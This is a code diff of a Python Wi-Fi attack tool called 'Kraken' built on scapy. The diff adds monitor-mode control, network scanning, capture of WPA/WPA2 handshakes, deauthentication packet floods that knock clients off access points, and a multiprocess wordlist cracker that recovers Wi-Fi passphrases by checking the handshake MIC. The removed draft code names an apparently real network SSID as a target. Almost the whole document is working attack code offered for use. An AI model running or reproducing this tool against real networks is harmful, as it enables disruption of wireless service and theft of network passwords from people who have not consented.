@@ -27,11 +27,13 @@ from scapy.all import (
     Dot11,
     Dot11Beacon,
     Dot11Elt,
+    Dot11Deauth,
     EAPOL,
     RadioTap,
     sendp,
     Packet,
 )
+from concurrent.futures import ProcessPoolExecutor, as_completed
 import subprocess
 import threading
 import hashlib
@@ -53,9 +55,135 @@ class Kraken:
 
     def __init__(self):
         """
-        Initialize Kraken instance and handhsake dictionary.
+        Initialize Kraken instance.
         """
-        self.handshake = {}
+
+    @staticmethod
+    def PRF512(key: bytes, A: bytes, B: bytes) -> bytes:
+        """
+        Pseudo-Random Function (PRF) using HMAC-SHA1 to generate a 512-bit key.
+
+        Args:
+            key (bytes): The key to use for the PRF.
+            A (bytes): The first input to the PRF.
+            B (bytes): The second input to the PRF.
+
+        Returns:
+            bytes: The derived key (PTK) of length 512 bits.
+        """
+        blen = 64
+        i = 0
+        R = b""
+
+        while i <= ((blen * 8 + 159) // 160):
+            hmacsha1 = hmac.new(key, A + b"\x00" + B + bytes([i]), hashlib.sha1)
+            R += hmacsha1.digest()
+            i += 1
+
+        return R[:blen]
+
+    @staticmethod
+    def list_interfaces():
+        """
+        List all available network interfaces.
+        """
+        os.system("clear")
+
+        try:
+            iw_dev = subprocess.check_output(
+                ["iw", "dev"], stderr=subprocess.DEVNULL
+            ).decode()
+            iw_list = subprocess.check_output(
+                ["iw", "list"], stderr=subprocess.DEVNULL
+            ).decode()
+            ip_links = (
+                subprocess.check_output(["ip", "-o", "link", "show"])
+                .decode()
+                .splitlines()
+            )
+
+        except Exception as e:
+            print(f"    [{RED}x{RESET}] Failed to use 'iw' or 'ip': {e}")
+
+        phy_map = {}
+
+        for block in [b for b in iw_dev.split("\n\n") if b.strip()]:
+            lines = [l.strip() for l in block.splitlines() if l.strip()]
+
+            if not lines or not lines[0].startswith("phy#"):
+                continue
+
+            phy = lines[0].replace("phy#", "phy")
+
+            for i, l in enumerate(lines):
+                if l.startswith("Interface"):
+                    iface = l.split()[1]
+                    addr = "N/A"
+                    itype = "N/A"
+
+                    for j in range(i + 1, len(lines)):
+                        if lines[j].startswith("addr "):
+                            addr = lines[j].split()[1]
+
+                        if lines[j].startswith("type "):
+                            itype = lines[j].split()[1]
+
+                    phy_map.setdefault(phy, []).append(
+                        {"iface": iface, "addr": addr, "type": itype}
+                    )
+
+        monitor_phys = set()
+
+        for block in [b for b in iw_list.split("Wiphy ") if b.strip()]:
+            header = block.splitlines()[0].strip()
+            phy = header if header.startswith("phy") else f"phy{header}"
+
+            if "Supported interface modes:" in block and "* monitor" in block:
+                monitor_phys.add(phy)
+
+        rows = []
+
+        for phy, ifaces in phy_map.items():
+            supports = phy in monitor_phys
+
+            for info in ifaces:
+                iface = info["iface"]
+                addr = info["addr"].upper()
+                cur_type = info["type"]
+                state = (
+                    "UP"
+                    if any(iface in l and "state UP" in l for l in ip_links)
+                    else "DOWN"
+                )
+                rows.append(
+                    {
+                        "iface": iface,
+                        "phy": phy,
+                        "mac": addr,
+                        "mode": cur_type,
+                        "state": state,
+                        "monitor_capable": supports,
+                    }
+                )
+
+        print(
+            f" {'IFACE':7} | {'PHY':4} | {'MODE':8} | {'STATE':6} | {'MAC':17} | SUPPORT"
+        )
+        print("─" * 80)
+
+        for r in rows:
+            support = (
+                f"{GREEN}Yes{RESET}" if r["monitor_capable"] else f"{RED}No{RESET}"
+            )
+            mode_color = (
+                f"{BLUE}{r['mode']}{RESET}" if r["mode"] == "monitor" else r["mode"]
+            )
+            print(
+                f" {r['iface']:<7} | {r['phy']:<4} | {mode_color:<8} | {r['state']:<6} | {r['mac']:<17} | {support}"
+            )
+
+        print("─" * 80)
+        print("\nUse 'sudo kraken start/stop <iface>' to enable/disable monitor mode.")
 
     @staticmethod
     def start_monitor(iface: str):
@@ -65,6 +193,11 @@ class Kraken:
         Args:
             iface (str): Network interface to set to monitor mode.
         """
+        os.system("clear")
+
+        print(f"Enabling monitor mode on interface {BLUE}{iface}{RESET}")
+        print("─" * 50)
+
         try:
             subprocess.run(["systemctl", "stop", "NetworkManager"], check=False)
             subprocess.run(["systemctl", "stop", "wpa_supplicant"], check=False)
@@ -72,8 +205,12 @@ class Kraken:
             subprocess.run(["iw", iface, "set", "type", "monitor"], check=True)
             subprocess.run(["ip", "link", "set", iface, "up"], check=True)
 
+            print(
+                f"    [{GREEN}✓{RESET}] Interface {iface} is now in {GREEN}monitor{RESET} mode.\n"
+            )
+
         except subprocess.CalledProcessError:
-            return
+            print(f"    [{RED}x{RESET}] Failed to change interface {iface} mode.\n")
 
     @staticmethod
     def stop_monitor(iface: str):
@@ -83,37 +220,61 @@ class Kraken:
         Args:
             iface (str): Network interface to stop monitor mode on.
         """
+        os.system("clear")
+
+        print(f"Disabling monitor mode on interface {BLUE}{iface}{RESET}")
+        print("─" * 50)
         try:
-            subprocess.run(["systemctl", "stop", "NetworkManager"], check=False)
-            subprocess.run(["systemctl", "stop", "wpa_supplicant"], check=False)
-            subprocess.run(["ip", "link", "set", iface, "down"])
+            subprocess.run(["ip", "link", "set", iface, "down"], check=True)
             subprocess.run(["iw", iface, "set", "type", "managed"], check=True)
-            subprocess.run(["ip", "link", "set", iface, "up"])
+            subprocess.run(["ip", "link", "set", iface, "up"], check=True)
             subprocess.run(["systemctl", "start", "wpa_supplicant"], check=False)
             subprocess.run(["systemctl", "start", "NetworkManager"], check=False)
 
-        except subprocess.CalledProcessError:
-            return
-
-    @staticmethod
-    def print_networks(networks):
-        """
-        Print the discovered Wi-Fi networks in a formatted table.
-
-        Args:
-            networks (dict): Dictionary containing network information.
-        """
-        os.system("clear")
-        print("BSSID              CH  PWR  ENC   BEAC  ESSID")
-        print("-" * 60)
-
-        for bssid, info in networks.items():
-            ssid = info["ssid"] if info["ssid"] else "<oculta>"
             print(
-                f"{bssid:<18} {info['channel']:<3} {info['signal']:<4} {info['encryption']:<5} {info['beacons']:<5} {ssid}"
+                f"    [{GREEN}✓{RESET}] Interface {iface} is now in {GREEN}managed{RESET} mode.\n"
             )
 
-    def get_encryption(self, pkt: Packet) -> str:
+        except subprocess.CalledProcessError:
+            print(f"    [{RED}x{RESET}] Failed to change interface {iface} mode.\n")
+
+    @staticmethod
+    def channel_hopper(iface: str, delay: int) -> threading.Event:
+        """
+        Change the network interface channel periodically.
+
+        Args:
+            iface (str): Network interface to change channels on.
+            delay (float): Delay between channel changes in seconds.
+
+        Returns:
+            threading.Event: Event to stop the channel hopping.
+        """
+        stop_event = threading.Event()
+
+        def hop():
+            """
+            Function to change channels periodically.
+            """
+            while not stop_event.is_set():
+                for ch in list(range(1, 14)):
+                    if stop_event.is_set():
+                        break
+
+                    subprocess.run(
+                        ["iw", iface, "set", "channel", str(ch)],
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                    )
+                    time.sleep(delay)
+
+        thread = threading.Thread(target=hop, daemon=True)
+        thread.start()
+
+        return stop_event
+
+    @staticmethod
+    def get_encryption(pkt: Packet) -> str:
         """
         Get the encryption type of a Wi-Fi packet.
 
@@ -141,210 +302,374 @@ class Kraken:
         else:
             return "Open"
 
-    def sniff_networks(self, iface: str):
+    @staticmethod
+    def display_info(mode: str, data: dict, bssid: str = None, channel: int = None):
         """
-        Sniff Wi-Fi networks and display their details.
+        Print the discovered Wi-Fi networks in a formatted table. If in handshake mode,
+        print the captured handshake information in a formatted table.
 
         Args:
-            iface (str): Network interface to sniff on.
+            mode (str): Mode of operation, either "scan" or "handshake".
+            data (dict): Dictionary containing network or handshake information.
+            bssid (str): BSSID of the target access point.
+            channel (int): Channel of the target access point.
         """
-        networks = {}
+        os.system("clear")
 
-        def handler(pkt: Packet):
-            """Callback function to handle sniffed packets.
+        if mode == "scan":
+            print(
+                " ESSID                     | BSSID             | ENC   | CH  | PWR   | BEAC"
+            )
+            print("─" * 75)
 
-            Args:
-                pkt: Sniffed packet.
-            """
-            if pkt.haslayer(Dot11Beacon):
-                bssid = pkt[Dot11].addr2
-                ssid = (
-                    pkt[Dot11Elt].info.decode(errors="ignore")
-                    if pkt.haslayer(Dot11Elt)
-                    else ""
+            for bssid, info in data.items():
+                ssid = info["ssid"] if info["ssid"] else "<hidden>"
+                print(
+                    f" {ssid:25} | {bssid} | {info['encryption']:<5} | {info['channel']:<3} | {info['signal']:<5} | {info['beacons']:<6} "
                 )
 
-                try:
-                    dbm_signal = pkt.dBm_AntSignal
+            print("─" * 75)
 
-                except:
-                    dbm_signal = "N/A"
+        elif mode == "handshake":
+            handshake = data
 
-                channel = None
-                elt = pkt.getlayer(Dot11Elt)
+            print(f"BSSID     : {bssid.upper()}")
+            print(f"Channel   : {channel}")
+            print("─" * 45)
+            print("EAPOL Packets:")
+            print(
+                (
+                    f"   • [{GREEN}✓{RESET}]"
+                    if handshake.get("ANonce")
+                    else f"   • [{RED}x{RESET}]"
+                ),
+                "Packet 1 (ANonce)",
+            )
+            print(
+                (
+                    f"   • [{GREEN}✓{RESET}]"
+                    if handshake.get("SNonce")
+                    else f"   • [{RED}x{RESET}]"
+                ),
+                "Packet 2 (SNonce)",
+            )
+            print(
+                (
+                    f"   • [{GREEN}✓{RESET}]"
+                    if handshake.get("MIC")
+                    else f"   • [{RED}x{RESET}]"
+                ),
+                "Packet 3 (MIC)",
+            )
+            print(
+                (
+                    f"   • [{GREEN}✓{RESET}]"
+                    if handshake.get("EAPOL")
+                    else f"   • [{RED}x{RESET}]"
+                ),
+                "Packet 4 (Full Frame)",
+            )
 
-                while elt:
-                    if elt.ID == 3:
-                        channel = elt.info[0]
+            if all(handshake.get(k) for k in ["ANonce", "SNonce", "MIC", "EAPOL"]):
+                print(f"\n{GREEN}Valid 4-Way Handshake Captured!{RESET}")
 
-                        break
+            else:
+                print("\nAwaiting handshake packets... Try a deauth.")
 
-                    elt = elt.payload.getlayer(Dot11Elt)
-
-                encryption = self.get_encryption(pkt)
-
-                if bssid not in networks:
-                    networks[bssid] = {
-                        "ssid": ssid,
-                        "signal": dbm_signal,
-                        "channel": channel if channel else "-",
-                        "encryption": encryption,
-                        "beacons": 1,
-                    }
-
-                else:
-                    networks[bssid]["signal"] = dbm_signal
-                    networks[bssid]["beacons"] += 1
-
-                self.print_networks(networks)
-
-        sniff(iface=iface, prn=handler)
-
-    def deauth(self, iface, target_bssid, client=None, count=10):
+    def check_password(
+        self,
+        password: str,
+        ssid: bytes,
+        ap: bytes,
+        client: bytes,
+        anonce: bytes,
+        snonce: bytes,
+        mic: bytes,
+        eapol: bytes,
+    ) -> bool:
         """
-        Envia pacotes de deauth para o AP ou para um cliente específico.
+        Check if the provided password matches the MIC.
+
+        Args:
+            password (str): Password to test.
+            ssid (bytes): SSID of the network.
+            ap (bytes): BSSID of the access point.
+            client (bytes): MAC address of the client.
+            anonce (bytes): ANonce from the handshake.
+            snonce (bytes): SNonce from the handshake.
+            mic (bytes): MIC from the handshake.
+            eapol (bytes): EAPOL packet from the handshake.
+
+        Returns:
+            bool: Password if the MIC matches, False otherwise.
         """
+        pmk = hashlib.pbkdf2_hmac("sha1", password.encode(), ssid, 4096, 32)
+
+        A = b"Pairwise key expansion"
+        B = (
+            min(ap, client)
+            + max(ap, client)
+            + min(anonce, snonce)
+            + max(anonce, snonce)
+        )
+        ptk = self.PRF512(pmk, A, B)
+        mic_key = ptk[:16]
+        eapol_zeroed = bytearray(eapol)
+        eapol_zeroed[81:97] = b"\x00" * 16
+        new_mic = hmac.new(mic_key, eapol_zeroed, hashlib.sha1).digest()[:16]
+
+        if new_mic == mic:
+            return password
+
+        return False
+
+    def deauth(self, iface: str, target_bssid: str, client: str, pkts: int):
+        """
+        Send deauthentication packets to a target client or broadcast.
+
+        Args:
+            iface (str): Network interface to send packets on.
+            target_bssid (str): BSSID of the target access point.
+            client (str): MAC address of the target client.
+            pkts (int): Number of deauth packets to send.
+        """
+        os.system("clear")
+
+        def handler(pkt: Packet) -> bool:
+            if pkt.haslayer(Dot11Beacon):
+                if (
+                    pkt.addr1.lower() == client.lower()
+                    and pkt.addr2.lower() == target_bssid.lower()
+                ):
+                    return True
+
+            return False
+
+        print(f"Waiting for beacon frame...", end="\r", flush=True)
+
+        if not sniff(iface=iface, stop_filter=handler, timeout=5):
+            print(
+                f"[{RED}x{RESET}] No beacon frame received for: {target_bssid.upper()}"
+            )
+
+            return
+
+        print(f"Sending Deauth to: {client.upper()} on AP: {target_bssid.upper()}")
+        print("─" * 65)
+
         dot11 = Dot11(
             type=0,
             subtype=12,
-            addr1=client or "ff:ff:ff:ff:ff:ff",
+            addr1=client,
             addr2=target_bssid,
             addr3=target_bssid,
         )
-        pkt = RadioTap() / dot11 / ("".join([chr(0x00)] * 32))
-        print(
-            f"{RED}[*] Enviando {count} deauths para {client or 'broadcast'} via {target_bssid}{RESET}"
-        )
-        for _ in range(count):
+        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
+
+        for i in range(1, pkts + 1):
             sendp(pkt, iface=iface, verbose=0)
-            time.sleep(0.1)
-        print(f"{GREEN}[✓] Deauth enviado!{RESET}")
+            print(f"   → Sent {i}/{pkts} deauth packets", end="\r", flush=True)
 
-    def channel_hopper(self, interface, delay=0.5, channels=None, stop_event=None):
-        """
-        Troca o canal da interface em modo monitor periodicamente.
-        """
-        if channels is None:
-            channels = list(range(1, 14))  # Canais 1 a 13 (2.4GHz)
-        if stop_event is None:
-            stop_event = threading.Event()
+        print(f"\n\n{GREEN}Deauth attack complete.{RESET}")
 
-        def hop():
-            while not stop_event.is_set():
-                for ch in channels:
-                    if stop_event.is_set():
-                        break
-                    subprocess.run(
-                        ["iw", interface, "set", "channel", str(ch)],
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
+    def dump_networks(self, iface: str, target_bssid: str = None, channel: int = None):
+        """
+        Sniff Wi-Fi networks and display their details. If a target BSSID and channel are provided,
+        it will sniff for WPA/WPA2 handshakes.
+
+        Args:
+            iface (str): Network interface to sniff on.
+            target_bssid (str): BSSID of the target access point.
+            channel (int): Channel to monitor for handshakes.
+        """
+        if target_bssid and channel:
+            handshake = {}
+
+            subprocess.run(
+                ["iw", iface, "set", "channel", str(channel)],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+
+            def handshake_handler(pkt: Packet):
+                updated = False
+
+                if (
+                    pkt.haslayer(Dot11Beacon)
+                    and not handshake.get("SSID")
+                    and pkt.addr2 == target_bssid
+                ):
+                    ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
+                    handshake["SSID"] = ssid if ssid else "<hidden>"
+                    updated = True
+
+                elif pkt.haslayer(EAPOL):
+                    src = pkt.addr2 if pkt.addr2 else ""
+                    dst = pkt.addr1 if pkt.addr1 else ""
+
+                    if target_bssid not in [src, dst]:
+                        return
+
+                    try:
+                        raw = bytes(pkt.getlayer(EAPOL))
+
+                    except:
+                        return
+
+                    if src == target_bssid and not handshake.get("ANonce"):
+                        handshake["AP"] = src
+                        handshake["Client"] = dst
+                        handshake["ANonce"] = raw.hex()[34:98]
+                        updated = True
+
+                    elif (
+                        dst == target_bssid
+                        and src == handshake.get("Client")
+                        and handshake.get("ANonce")
+                        and not handshake.get("SNonce")
+                    ):
+                        handshake["SNonce"] = raw.hex()[34:98]
+                        handshake["MIC"] = raw.hex()[162:194]
+                        handshake["EAPOL"] = raw.hex()
+                        updated = True
+
+                if updated:
+                    self.display_info(
+                        "handshake", handshake, bssid=target_bssid, channel=channel
                     )
-                    time.sleep(delay)
 
-        thread = threading.Thread(target=hop, daemon=True)
-        thread.start()
-        return stop_event
+            sniff(
+                iface=iface,
+                prn=handshake_handler,
+                stop_filter=lambda pkt: all(
+                    handshake.get(k) for k in ["ANonce", "SNonce", "MIC", "EAPOL"]
+                ),
+            )
 
-    def handshake_handler(pkt):
+            with open("handshake.json", "w") as f:
+                json.dump(handshake, f, indent=2)
 
-        if pkt.haslayer(EAPOL):
-            src = pkt.addr2.lower() if pkt.addr2 else ""
-            dst = pkt.addr1.lower() if pkt.addr1 else ""
+        else:
+            networks = {}
 
-            try:
-                raw = bytes(pkt.getlayer(EAPOL))
-            except:
-                return
+            def handler(pkt: Packet):
+                if pkt.haslayer(Dot11Beacon):
+                    bssid = pkt[Dot11].addr2.upper()
+                    ssid = (
+                        pkt[Dot11Elt].info.decode(errors="ignore")
+                        if pkt.haslayer(Dot11Elt)
+                        else ""
+                    )
 
-            if target_bssid not in [src, dst]:
-                return
+                    try:
+                        dbm_signal = pkt.dBm_AntSignal
 
-            # Message 1: AP -> Client
-            if src == target_bssid and not handshake.get("ANonce"):
-                handshake["AP"] = src
-                handshake["Client"] = dst
-                handshake["ANonce"] = raw.hex()[34:98]
-                print("[1] ANonce capturado")
+                    except:
+                        dbm_signal = "N/A"
 
-            # Captura SNonce apenas se vier do cliente e ANonce já foi capturado
-            elif (
-                dst == target_bssid
-                and handshake.get("ANonce")
-                and not handshake.get("SNonce")
-            ):
-                handshake["SNonce"] = raw.hex()[34:98]
-                handshake["MIC"] = raw.hex()[162:194]
+                    channel = None
+                    elt = pkt.getlayer(Dot11Elt)
 
-                eapol_zeroed = bytearray(raw)
-                eapol_zeroed[81:97] = b"\x00" * 16
-                handshake["EAPOL"] = eapol_zeroed.hex()
+                    while elt:
+                        if elt.ID == 3:
+                            channel = elt.info[0]
+                            break
 
-                with open("handshake_data.json", "w") as f:
-                    json.dump(handshake, f, indent=2)
+                        elt = elt.payload.getlayer(Dot11Elt)
 
-                print("[✓] Handshake salvo com sucesso!")
-                exit()
+                    encryption = self.get_encryption(pkt)
 
-    def customPRF512(key, A, B):
-        blen = 64
-        i = 0
-        R = b""
-        while i <= ((blen * 8 + 159) // 160):
-            hmacsha1 = hmac.new(key, A + b"\x00" + B + bytes([i]), hashlib.sha1)
-            R += hmacsha1.digest()
-            i += 1
-        return R[:blen]
+                    if bssid not in networks:
+                        networks[bssid] = {
+                            "ssid": ssid,
+                            "signal": dbm_signal,
+                            "channel": channel if channel else "-",
+                            "encryption": encryption,
+                            "beacons": 1,
+                        }
 
-    # Função para verificar o MIC
-    def check_mic(pmk, eapol_data, mic_to_test):
-        A = b"Pairwise key expansion"
-        B = (
-            min(APmac, Clientmac)
-            + max(APmac, Clientmac)
-            + min(ANonce, SNonce)
-            + max(ANonce, SNonce)
-        )
-        ptk = customPRF512(pmk, A, B)
-        mic_key = ptk[:16]
-        mic = hmac.new(mic_key, eapol_data, hashlib.sha1).digest()[:16]
-        return mic == mic_to_test
+                    else:
+                        networks[bssid]["signal"] = dbm_signal
+                        networks[bssid]["beacons"] += 1
 
-    """# Carregar o handshake do JSON
-    with open("handshake_data.json", "r") as f:
-        handshake_info = json.load(f)
+                    self.display_info("scan", networks)
 
-    # Informações do JSON
-    SSID = "Fasipe Coordenação".encode(
-        "utf-8"
-    )  # O SSID da rede, pode ser passado ou lido diretamente do JSON
-    APmac = bytes.fromhex(handshake_info["APmac"].replace(":", ""))
-    Clientmac = bytes.fromhex(handshake_info["Clientmac"].replace(":", ""))
-    ANonce = bytes.fromhex(handshake_info["ANonce"])
-    SNonce = bytes.fromhex(handshake_info["SNonce"])
-    MIC = bytes.fromhex(handshake_info["MIC"])
-    EAPOL = bytes.fromhex(handshake_info["EAPOL"])"""
+            self.channel_hopper(iface, 0.25)
+            sniff(iface=iface, prn=handler)
 
-    # Função de quebra de senha
-    def crack_password(wordlist_path):
-        with open(wordlist_path, "r", encoding="utf-8") as f:
-            for password in f:
-                password = password.strip()
-                print(f"Tentando senha: {password}")
+    def crack_handshake(self, wordlist: str, handshake: str):
+        """
+        Crack WPA/WPA2 handshake using a wordlist.
 
-                # Gerar PMK (Password Master Key) com o SSID e a passphrase
-                pmk = hashlib.pbkdf2_hmac("sha1", password.encode(), SSID, 4096, 32)
+        Args:
+            wordlist (str): Path to the wordlist file.
+            handshake (str): Path to the handshake file.
+        """
+        os.system("clear")
 
-                # Verificar MIC
-                if check_mic(pmk, EAPOL, MIC):
-                    print(f"[💜] Senha encontrada: {password}")
-                    return password
-        print("[x] Nenhuma senha da wordlist funcionou.")
+        with open(handshake, "r") as f:
+            handshake_info = json.load(f)
 
+        SSID = handshake_info["SSID"].encode("utf-8")
+        AP = bytes.fromhex(handshake_info["AP"].replace(":", ""))
+        Client = bytes.fromhex(handshake_info["Client"].replace(":", ""))
+        ANonce = bytes.fromhex(handshake_info["ANonce"])
+        SNonce = bytes.fromhex(handshake_info["SNonce"])
+        MIC = bytes.fromhex(handshake_info["MIC"])
+        EAPOL = bytes.fromhex(handshake_info["EAPOL"])
 
-if __name__ == "__main__":
-    kraken = Kraken()
-    iface = "wlan0mon"  # ou sua interface em modo monitor
+        with open(wordlist, "r", encoding="utf-8") as f:
+            passwords = [line.strip() for line in f if line.strip()]
 
-    cmd = input("Comando (scan/deauth/start/stop): ").strip()
-    if cmd == "scan":
-        kraken.sniff_networks(iface)
+        print(f"Target     : {handshake_info['SSID']} ({handshake_info['AP'].upper()})")
+        print(f"Wordlist   : {wordlist}")
+        print("─" * 50)
+
+        found = None
+        start = time.time()
+        keys_tested = 0
+
+        with ProcessPoolExecutor() as executor:
+            futures = {
+                executor.submit(
+                    self.check_password,
+                    pwd,
+                    SSID,
+                    AP,
+                    Client,
+                    ANonce,
+                    SNonce,
+                    MIC,
+                    EAPOL,
+                ): pwd
+                for pwd in passwords
+            }
+
+            for future in as_completed(futures):
+                pwd = futures[future]
+                result = future.result()
+                keys_tested += 1
+                elapsed = time.time() - start
+                speed = keys_tested / elapsed if elapsed > 0 else 0
+
+                print(f"\n    Testing    : {pwd}")
+                print(f"\n    Keys tried : {keys_tested}")
+                print(f"    Speed      : {int(speed)} keys/sec")
+                print(
+                    f"    Elapsed    : {time.strftime('%H:%M:%S', time.gmtime(elapsed))}\n"
+                )
+                print("\033[F\033[K" * 7, end="")
+                time.sleep(0.1)
+
+                if result:
+                    found = result
+                    break
+
+        if found:
+            print(f"\n[{GREEN}✓{RESET}] Key Found! → {GREEN}{found}{RESET}")
+            print(
+                f"\n    Elapsed    : {time.strftime('%H:%M:%S', time.gmtime(elapsed))}"
+            )
+
+        else:
+            print(f"\n    [{RED}x{RESET}] No Key Found.")
